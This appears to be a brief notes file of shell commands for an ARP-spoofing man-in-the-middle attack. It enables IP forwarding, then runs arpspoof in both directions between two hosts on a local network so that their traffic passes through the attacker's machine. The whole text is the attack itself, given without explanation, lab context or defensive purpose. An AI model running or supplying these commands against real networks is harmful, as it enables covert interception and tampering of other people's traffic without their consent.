#enable IP forwarding:
echo 1 > /proc/sys/net/ipv4/ip_forward

sudo arpspoof -i enp0s3 -t 192.168.8.103 192.168.8.102

sudo arpspoof -i enp0s3 -t 192.168.8.102 192.168.8.103
